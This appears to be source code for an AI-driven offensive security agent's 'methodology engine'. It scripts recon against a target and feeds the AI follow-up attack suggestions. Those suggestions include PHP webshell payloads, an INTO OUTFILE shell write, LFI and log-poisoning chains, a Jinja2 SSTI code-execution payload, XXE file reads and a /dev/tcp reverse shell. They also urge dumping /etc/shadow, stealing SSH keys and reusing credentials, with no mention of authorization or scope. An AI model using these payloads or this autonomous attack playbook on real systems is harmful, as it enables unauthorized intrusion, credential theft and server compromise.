"""
Jack The Shadow — Methodology Engine

Provides predefined attack chains and smart follow-up suggestions.
Instead of relying on the AI to invent tool chains from scratch,
this module provides concrete step-by-step playbooks that the
orchestrator can inject as context.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from jack_the_shadow.utils.logger import get_logger

logger = get_logger("core.methodology")


# ── Phase Definitions ────────────────────────────────────────────────

PHASES = ("recon", "enum", "vuln", "exploit", "post_exploit", "report")

# Tools relevant to each phase (others are always available)
PHASE_TOOLS: dict[str, frozenset[str]] = {
    "recon": frozenset({
        "network_recon", "web_search", "web_fetch", "cve_lookup",
        "shodan_recon", "doctor_check", "http_request",
    }),
    "enum": frozenset({
        "http_request", "web_fetch", "grep_search", "glob_find",
        "list_directory", "exploit_search", "network_recon",
    }),
    "vuln": frozenset({
        "http_request", "web_fetch", "cve_lookup", "exploit_search",
        "payload_generate", "encode_decode", "web_search",
    }),
    "exploit": frozenset({
        "payload_generate", "python_repl", "encode_decode",
        "http_request", "exploit_search", "hash_analyze",
        "network_recon", "web_fetch", "web_search", "file_write",
    }),
    "post_exploit": frozenset({
        "file_read", "file_write", "grep_search", "glob_find",
        "list_directory", "hash_analyze", "python_repl",
    }),
    "report": frozenset({
        "report_generate", "file_write", "git_command",
    }),
}

# Core tools always sent regardless of phase
CORE_TOOLS: frozenset[str] = frozenset({
    "bash_execute", "file_read", "file_write", "file_edit",
    "memory_read", "memory_write", "todo_read", "todo_write",
    "batch_execute", "ask_user", "web_search", "web_fetch",
    "python_repl", "mcp_call",
})


def get_phase_tools(phase: str) -> frozenset[str]:
    """Get tool names relevant for the given phase + core tools."""
    phase_specific = PHASE_TOOLS.get(phase, frozenset())
    return CORE_TOOLS | phase_specific


# ── Auto-Recon Playbook ──────────────────────────────────────────────

@dataclass
class ReconStep:
    """A single step in an automated recon chain."""
    tool: str
    args: dict[str, Any]
    description: str


def build_auto_recon_chain(target: str) -> list[ReconStep]:
    """Build the initial recon batch for a domain/IP target."""
    is_ip = _looks_like_ip(target)
    domain = target.strip().lower()

    steps: list[ReconStep] = []

    if not is_ip:
        steps.extend([
            ReconStep("network_recon", {
                "action": "dns_lookup", "target": domain, "risk_level": "Low",
            }, f"DNS lookup {domain}"),
            ReconStep("network_recon", {
                "action": "whois", "target": domain, "risk_level": "Low",
            }, f"WHOIS {domain}"),
            ReconStep("web_fetch", {
                "url": f"https://{domain}", "max_length": 5000,
            }, f"Fetch homepage https://{domain}"),
            ReconStep("network_recon", {
                "action": "ssl_info", "target": domain, "risk_level": "Low",
            }, f"SSL/TLS info {domain}"),
        ])
    else:
        steps.extend([
            ReconStep("network_recon", {
                "action": "reverse_dns", "target": domain, "risk_level": "Low",
            }, f"Reverse DNS {domain}"),
        ])

    # Common for both domain and IP
    steps.extend([
        ReconStep("network_recon", {
            "action": "port_scan", "target": domain,
            "ports": "21,22,25,53,80,110,143,443,445,993,995,3306,3389,5432,5900,8080,8443,8888,9090",
            "risk_level": "Low",
        }, f"Port scan {domain}"),
        ReconStep("web_search", {
            "query": f'site:{domain} OR "{domain}" vulnerability OR CVE OR exploit',
            "max_results": 5,
        }, f"Web search for known vulns on {domain}"),
    ])

    if not is_ip:
        steps.append(ReconStep("web_search", {
            "query": f'site:{domain} -www inurl:api OR inurl:admin OR inurl:login OR inurl:dev',
            "max_results": 5,
        }, f"Search interesting endpoints for {domain}"))

    return steps


def recon_chain_to_batch_args(steps: list[ReconStep]) -> dict[str, Any]:
    """Convert recon steps to batch_execute arguments."""
    return {
        "calls": [
            {"tool_name": s.tool, "arguments": s.args}
            for s in steps
        ],
        "risk_level": "Low",
    }


# ── Result Analysis ──────────────────────────────────────────────────

def analyze_results(tool_name: str, args: dict[str, Any],
                    result_data: dict[str, Any]) -> list[str]:
    """Analyze tool output and suggest follow-up actions.

    Returns a list of actionable suggestions for the AI.
    """
    suggestions: list[str] = []
    output = str(result_data.get("output", "") or result_data.get("message", ""))
    output_lower = output.lower()

    if tool_name == "network_recon":
        action = args.get("action", "")
        suggestions.extend(_analyze_network_result(action, output_lower, args))

    elif tool_name == "web_fetch":
        suggestions.extend(_analyze_web_result(output_lower, args))

    elif tool_name == "web_search":
        suggestions.extend(_analyze_search_result(output_lower, args))

    elif tool_name == "http_request":
        suggestions.extend(_analyze_http_result(output_lower, args))

    elif tool_name == "bash_execute":
        suggestions.extend(_analyze_bash_result(output_lower, args))

    elif tool_name == "batch_execute":
        suggestions.extend(_analyze_batch_result(output_lower, args))

    elif tool_name == "cve_lookup":
        suggestions.extend(_analyze_cve_result(output_lower, args))

    elif tool_name == "exploit_search":
        suggestions.extend(_analyze_exploit_result(output_lower, args))

    elif tool_name == "payload_generate":
        suggestions.extend(_analyze_payload_result(output_lower, args))

    return suggestions


def _analyze_network_result(action: str, output: str,
                            args: dict[str, Any]) -> list[str]:
    s: list[str] = []
    target = args.get("target", "")

    if action == "port_scan":
        if "open" in output:
            if any(p in output for p in ["80/open", "443/open", "8080/open", "8443/open"]):
                s.append(
                    f"Web server detected → web_fetch the homepage, "
                    f"check response headers with http_request (look for Server, "
                    f"X-Powered-By, cookies), search for hidden dirs with bash "
                    f"(dirb/gobuster/feroxbuster if installed)"
                )
            if "22/open" in output:
                s.append(
                    f"SSH open → grab banner with bash_execute('nc -w3 {target} 22'), "
                    f"check for CVEs on the SSH version"
                )
            if any(p in output for p in ["3306/open", "5432/open"]):
                s.append(
                    "Database port open → check if authentication required, "
                    "try default credentials, search for version-specific CVEs"
                )
            if "21/open" in output:
                s.append(
                    f"FTP open → check anonymous login with bash_execute("
                    f"'curl -s ftp://{target}/'), grab banner"
                )
            if "445/open" in output:
                s.append(
                    "SMB open → enumerate shares with smbclient, check for EternalBlue"
                )
        if "open" not in output:
            s.append(
                "No common ports open → try expanded scan (top 1000), "
                "or check if target uses CDN/WAF that blocks scans"
            )

    elif action == "dns_lookup":
        if "cloudflare" in output or "cloudfront" in output:
            s.append(
                "CDN/WAF detected → try to find origin IP via historical DNS, "
                "check SecurityTrails, try direct IP scan"
            )
        if "mx records" in output:
            s.append(
                "MX records found → check for email misconfig, SPF/DKIM/DMARC records"
            )

    elif action == "whois":
        if "registrar" in output:
            s.append(
                "WHOIS data → note registrar, creation date, nameservers. "
                "Search for other domains on same registrant email"
            )

    elif action == "ssl_info":
        if "expired" in output or "self-signed" in output:
            s.append("SSL issue found → potential for MITM, report as finding")
        if "subject" in output:
            s.append(
                "Check SSL cert SANs for additional hostnames/subdomains"
            )

    return s


def _analyze_web_result(output: str, args: dict[str, Any]) -> list[str]:
    s: list[str] = []
    url = args.get("url", "")

    # ── CMS → known RCE paths ──
    if "wordpress" in output:
        s.append(
            "WordPress detected → PRIORITY: check /wp-json/wp/v2/users (user enum), "
            "/xmlrpc.php (brute force + SSRF), run wpscan for plugin vulns, "
            "search for RCE CVEs on detected plugins/themes. "
            "Try /wp-content/uploads/ for file upload abuse"
        )
    if "joomla" in output:
        s.append(
            "Joomla → check /administrator/, search component vulns, "
            "try Joomla RCE CVEs (CVE-2023-23752, CVE-2015-8562)"
        )
    if "drupal" in output:
        s.append(
            "Drupal → check /CHANGELOG.txt version, try Drupalgeddon2 "
            "(CVE-2018-7600) RCE, Drupalgeddon3 (CVE-2018-7602)"
        )
    if "laravel" in output:
        s.append(
            "Laravel → IMMEDIATE: check /.env (creds+APP_KEY leak), "
            "/telescope (debug data), try CVE-2021-3129 (ignition RCE), "
            "if APP_KEY leaked → craft deserialization payload for RCE"
        )
    if "django" in output:
        s.append(
            "Django → check /admin/, DEBUG=True info disclosure, "
            "try CVE-2022-34265 (SQLi), REST framework unauth endpoints"
        )
    if "flask" in output or "werkzeug" in output:
        s.append(
            "Flask/Werkzeug → check /console (debugger RCE if PIN bypassed), "
            "try SSTI in parameters: {{7*7}}, {{config.items()}}"
        )
    if "spring" in output or "springboot" in output:
        s.append(
            "Spring → try Spring4Shell (CVE-2022-22965) RCE, "
            "check /actuator endpoints, /env for cred leak, /heapdump"
        )
    if "struts" in output:
        s.append(
            "Apache Struts → HIGH PRIORITY RCE: try CVE-2017-5638, "
            "CVE-2018-11776, CVE-2023-50164 file upload RCE"
        )
    if "tomcat" in output:
        s.append(
            "Tomcat → check /manager/ (default creds tomcat:tomcat), "
            "WAR file upload → webshell, try CVE-2017-12617 PUT RCE, "
            "Ghostcat CVE-2020-1938 (AJP port 8009)"
        )

    # ── JS frameworks → API hunting ──
    if "next" in output or "react" in output or "vue" in output:
        s.append(
            "JS framework → check /api/, /_next/, source maps for API keys, "
            "look for SSRF in image proxy endpoints, check for exposed .env"
        )
    if "api" in output or "swagger" in output or "openapi" in output:
        s.append(
            "API detected → enumerate ALL endpoints, test auth bypass (remove token), "
            "IDOR (change IDs), mass assignment (add admin=true), rate limit bypass, "
            "try SSRF via URL parameters, check for GraphQL (/graphql introspection)"
        )

    # ── Offensive patterns ──
    if "login" in output or "signin" in output:
        s.append(
            "Login form → PRIORITY: test SQL injection on username/password fields "
            "(' OR 1=1--, admin'--), try default creds, check for user enumeration "
            "via error messages, test password reset for IDOR/token prediction"
        )
    if "upload" in output or "file" in output and ("input" in output or "multipart" in output):
        s.append(
            "FILE UPLOAD FOUND → HIGH PRIORITY: write webshell with file_write "
            "(<?php system($_GET['c']); ?>), try upload with extensions: "
            ".php, .php5, .phtml, .pHp, .php.jpg, .php%00.jpg. "
            "Test Content-Type bypass (image/jpeg with PHP content). "
            "If upload succeeds, navigate to uploaded file for RCE"
        )
    if "include" in output or "file=" in output or "path=" in output or "page=" in output:
        s.append(
            "POSSIBLE LFI → test with payload_generate(category: lfi): "
            "../../etc/passwd, php://filter/convert.base64-encode/resource=index.php, "
            "Chain to RCE: php://input with POST body, data://text/plain;base64, "
            "log poisoning (inject <?php system('id');?> in User-Agent → include access.log)"
        )
    if "template" in output or "render" in output or "{{" in output:
        s.append(
            "POSSIBLE SSTI → test: {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>, "
            "{{''.__class__.__mro__[1].__subclasses__()}} for Jinja2 RCE chain"
        )
    if "token" in output or "jwt" in output or "bearer" in output:
        s.append(
            "JWT/token found → decode with encode_decode (JWT mode), check for "
            "'none' algorithm, weak secret (try jwt_tool), forge admin token"
        )
    if "serialize" in output or "base64" in output and "object" in output:
        s.append(
            "DESERIALIZATION VECTOR → identify language (PHP/Java/Python/.NET), "
            "generate payload: PHP unserialize gadget chain, Java ysoserial, "
            "Python pickle RCE. Use encode_decode for payload encoding"
        )
    if "server:" in output or "x-powered-by:" in output:
        s.append(
            "Server version exposed → search for version-specific RCE CVEs "
            "with cve_lookup + exploit_search"
        )
    if "debug" in output or "stack trace" in output or "traceback" in output:
        s.append(
            "DEBUG/ERROR INFO LEAK → extract: file paths, framework version, "
            "database type, internal IPs. Use these for targeted exploit search"
        )
    if "admin" in output and ("panel" in output or "dashboard" in output):
        s.append(
            "Admin panel → test default creds, SQL injection bypass, "
            "check for file manager/upload functionality for webshell upload"
        )
    if "phpmyadmin" in output:
        s.append(
            "phpMyAdmin → test default creds (root:, root:root), "
            "if access gained: SELECT INTO OUTFILE for webshell, "
            "or SQL query: SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'"
        )

    return s


def _analyze_search_result(output: str, args: dict[str, Any]) -> list[str]:
    s: list[str] = []

    if "cve-" in output:
        s.append(
            "CVE references found → use cve_lookup for CVSS + details, "
            "then exploit_search for RCE exploits. Prioritize CVSS >= 7.0 "
            "and 'remote code execution' tagged CVEs"
        )
    if "exploit" in output or "poc" in output or "proof of concept" in output:
        s.append(
            "Exploit/PoC found → web_fetch the URL to get full exploit code, "
            "adapt and reproduce on target. If it's RCE → immediate priority"
        )
    if "rce" in output or "remote code" in output or "command execution" in output:
        s.append(
            "RCE EXPLOIT FOUND → HIGHEST PRIORITY: web_fetch the article, "
            "extract PoC code, adapt for target, execute via python_repl or bash"
        )
    if "shell" in output and ("upload" in output or "web" in output):
        s.append(
            "Webshell/shell upload reference → read the technique, "
            "generate matching webshell with file_write, try upload path"
        )
    if "github" in output and ("vuln" in output or "exploit" in output):
        s.append(
            "GitHub exploit repo → web_fetch the README, clone or extract "
            "the exploit script, evaluate applicability to target"
        )
    if "sql injection" in output or "sqli" in output:
        s.append(
            "SQLi reference → test with payload_generate(category: sqli), "
            "if confirmed escalate to file write/shell via INTO OUTFILE or xp_cmdshell"
        )
    if "xss" in output:
        s.append(
            "XSS reference → test stored/reflected XSS, if stored → chain to "
            "session hijacking, phishing, or DOM-based attack for deeper access"
        )

    return s


def _analyze_http_result(output: str, args: dict[str, Any]) -> list[str]:
    s: list[str] = []
    url = str(args.get("url", ""))
    method = str(args.get("method", "GET")).upper()

    if "401" in output or "403" in output:
        s.append(
            "Auth/Forbidden → try bypass: HTTP verb tampering (PUT/PATCH/OPTIONS), "
            "path tricks (/./admin, /admin;, /admin%00), "
            "headers: X-Forwarded-For: 127.0.0.1, X-Original-URL, X-Rewrite-URL"
        )
    if "500" in output or "internal server error" in output:
        s.append(
            "Server error → injection vector! Try: SQL injection, SSTI, "
            "command injection, XXE in request body. "
            "Check if error reveals stack trace, paths, or config"
        )
    if "200" in output and method == "PUT":
        s.append(
            "PUT method accepted → try writing webshell: "
            "PUT /shell.php with body <?php system($_GET['c']); ?>"
        )
    if "redirect" in output or "302" in output or "301" in output:
        s.append(
            "Redirect → check for open redirect (change redirect URL to attacker site), "
            "follow chain to see final destination"
        )
    if "set-cookie" in output:
        s.append(
            "Cookies → check missing HttpOnly/Secure/SameSite flags, "
            "test for session fixation, analyze token for prediction"
        )
    if "allow" in output and "options" in output.lower():
        s.append(
            "OPTIONS revealed allowed methods → if PUT/DELETE available, "
            "try file upload via PUT, resource deletion via DELETE"
        )
    if "xml" in output or "soap" in output:
        s.append(
            "XML/SOAP endpoint → try XXE injection: "
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> "
            "for file read, then try SSRF via external entity"
        )
    if "graphql" in output:
        s.append(
            "GraphQL → run introspection query {__schema{types{name,fields{name}}}}, "
            "enumerate all queries/mutations, test for auth bypass per field, "
            "check for batch query DoS, nested query injection"
        )

    return s


def _analyze_bash_result(output: str, args: dict[str, Any]) -> list[str]:
    s: list[str] = []
    cmd = str(args.get("command", ""))

    if "nmap" in cmd and "open" in output:
        s.append(
            "Services found → enumerate EACH open service, "
            "search version-specific RCE CVEs with exploit_search"
        )
    if "gobuster" in cmd or "dirb" in cmd or "feroxbuster" in cmd:
        if "200" in output or "301" in output:
            s.append(
                "Directories/files found → web_fetch each interesting path, "
                "look for admin panels, upload forms, config files, backups (.bak, .old, .zip)"
            )
    if "wpscan" in cmd:
        if "vulnerable" in output or "cve" in output:
            s.append(
                "WordPress vulns found → exploit_search for each CVE, "
                "prioritize RCE and auth bypass, try exploit immediately"
            )
    if "sqlmap" in cmd:
        if "injectable" in output or "vulnerable" in output:
            s.append(
                "SQLi confirmed → escalate: try --os-shell for RCE, "
                "--file-read for sensitive files, --file-write for webshell upload"
            )
    if "nikto" in cmd or "nuclei" in cmd:
        if "vuln" in output or "critical" in output or "high" in output:
            s.append(
                "Vulns found by scanner → verify each manually, "
                "prioritize RCE/file upload/injection findings"
            )

    # Generic output analysis
    if "password" in output or "credential" in output or "passwd" in output:
        s.append(
            "CREDENTIALS FOUND → save with memory_write IMMEDIATELY, "
            "try to reuse on other services (SSH, DB, admin panels)"
        )
    if "permission denied" in output or "access denied" in output:
        s.append(
            "Access denied → try privesc: check SUID binaries, sudo -l, "
            "writable cron jobs, kernel exploit for local version"
        )
    if "root" in output and ("uid=0" in output or "euid=0" in output):
        s.append(
            "ROOT ACCESS ACHIEVED → save proof with memory_write, "
            "enumerate sensitive files, dump /etc/shadow, check for pivot targets"
        )
    if "www-data" in output or "apache" in output or "nginx" in output:
        s.append(
            "Web user shell → try privesc: check /var/www for config files with creds, "
            "SUID binaries, writable cron, kernel version for local exploit"
        )
    if "/etc/passwd" in output and "root:" in output:
        s.append(
            "File read confirmed → try /etc/shadow, database configs, "
            "SSH keys (~/.ssh/id_rsa), .env files, wp-config.php"
        )

    return s


def _analyze_batch_result(output: str, args: dict[str, Any]) -> list[str]:
    s: list[str] = []

    # Aggregate analysis from individual results
    if "open" in output:
        s.append(
            "Recon complete → save all findings with memory_write, "
            "create attack plan with todo_write, move to enumeration phase"
        )
    if "cloudflare" in output or "waf" in output:
        s.append(
            "WAF/CDN detected → adjust techniques: try origin IP discovery, "
            "use targeted payloads that bypass WAF rules"
        )

    return s


def _analyze_cve_result(output: str, args: dict[str, Any]) -> list[str]:
    """Analyze CVE lookup results for exploitation opportunities."""
    s: list[str] = []

    if "critical" in output or "9." in output or "10.0" in output:
        s.append(
            "CRITICAL CVE → IMMEDIATE: run exploit_search for this CVE, "
            "web_search for PoC/exploit code, check if target version matches"
        )
    if "remote code execution" in output or "rce" in output:
        s.append(
            "RCE CVE → HIGHEST PRIORITY: find exploit/PoC, adapt for target, "
            "execute immediately. Check Metasploit modules if available"
        )
    if "sql injection" in output:
        s.append(
            "SQLi CVE → test with sqlmap or manual payload, "
            "escalate to shell via --os-shell or INTO OUTFILE"
        )
    if "file upload" in output or "unrestricted" in output:
        s.append(
            "File upload CVE → generate webshell with file_write, "
            "exploit the upload vulnerability for RCE"
        )
    if "authentication bypass" in output or "auth bypass" in output:
        s.append(
            "Auth bypass CVE → exploit to gain admin access, "
            "then look for file upload/code execution in admin panel"
        )
    if "deserialization" in output:
        s.append(
            "Deserialization CVE → generate payload (ysoserial/phpggc/pickle), "
            "encode with encode_decode, send to vulnerable endpoint"
        )
    if "path traversal" in output or "lfi" in output or "local file" in output:
        s.append(
            "LFI/path traversal CVE → read /etc/passwd first, then escalate: "
            "read SSH keys, config files with creds, try log poisoning for RCE"
        )

    return s


def _analyze_exploit_result(output: str, args: dict[str, Any]) -> list[str]:
    """Analyze exploit search results."""
    s: list[str] = []

    if "exploit" in output and ("db" in output or "id:" in output):
        s.append(
            "Exploits found → web_fetch the top result for full code, "
            "prioritize: RCE > auth bypass > file upload > info disclosure"
        )
    if "metasploit" in output:
        s.append(
            "Metasploit module available → note the module path, "
            "if msfconsole is installed use bash_execute to run it"
        )
    if "python" in output or "ruby" in output or "bash" in output:
        s.append(
            "Script-based exploit → web_fetch the code, save with file_write, "
            "adapt for target (change IP/port/path), execute via python_repl or bash"
        )
    if "no results" in output or "not found" in output:
        s.append(
            "No exploits found → try: web_search for CVE + PoC on GitHub, "
            "manual testing with payload_generate, try common web vuln checks"
        )

    return s


def _analyze_payload_result(output: str, args: dict[str, Any]) -> list[str]:
    """Analyze payload generation/injection test results."""
    s: list[str] = []
    category = str(args.get("category", ""))

    if "success" in output or "executed" in output:
        s.append(
            "PAYLOAD WORKED → escalate immediately: if SQLi → try shell, "
            "if XSS → try session hijack, if LFI → try RCE chain, "
            "if SSTI → try OS command execution"
        )
    if category == "sqli" and ("error" not in output or "sql" in output):
        s.append(
            "SQLi test → if response differs from normal: confirm with time-based "
            "(SLEEP(5)), then try UNION-based extraction or --os-shell"
        )
    if category == "xss":
        s.append(
            "XSS test → check if payload reflected/stored, "
            "if stored → craft session stealing payload, "
            "if DOM-based → explore JS sink for deeper exploitation"
        )
    if category == "lfi":
        s.append(
            "LFI test → try: /etc/passwd, /proc/self/environ, "
            "PHP wrappers (php://filter), log poisoning chain to RCE"
        )
    if category == "ssti":
        s.append(
            "SSTI test → if {{7*7}}=49: confirmed! Chain to RCE: "
            "Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
        )
    if category == "cmdi":
        s.append(
            "Command injection test → if confirmed: immediate RCE! "
            "Try reverse shell: ;bash -i >& /dev/tcp/LHOST/LPORT 0>&1"
        )

    return s


def format_suggestions(suggestions: list[str], lang: str = "en") -> str:
    """Format suggestions into a concise context injection string."""
    if not suggestions:
        return ""

    header = (
        "[INTEL] Based on results, suggested next moves:"
        if lang != "id" else
        "[INTEL] Berdasarkan hasil, langkah selanjutnya:"
    )

    lines = [f"• {s}" for s in suggestions[:5]]  # max 5 suggestions
    return f"\n{header}\n" + "\n".join(lines)


# ── Helpers ───────────────────────────────────────────────────────────

def _looks_like_ip(target: str) -> bool:
    try:
        import ipaddress as ipa
        ipa.ip_address(target.strip())
        return True
    except ValueError:
        return False
